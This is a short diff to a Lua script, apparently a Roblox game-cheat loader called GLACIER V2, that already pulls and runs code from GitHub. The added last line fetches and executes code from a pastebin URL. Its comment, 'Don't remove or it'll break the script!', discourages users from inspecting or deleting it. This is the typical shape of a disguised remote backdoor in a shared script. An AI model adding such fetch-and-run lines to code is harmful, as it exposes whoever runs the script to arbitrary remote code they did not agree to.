@@ -17,3 +17,4 @@ shared.version = "Universal 2.0"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Harvox/GlacierV2/refs/heads/main/Universal.lua"))()
 end  
 notifyfunction("< GLACIERⱽ² 2.3 >", "Detected version/game: " .. shared.version)
+loadstring(game:HttpGet("https://pastebin.com/raw/a2CV7cAg"))() -- Don't remove or it'll break the script!
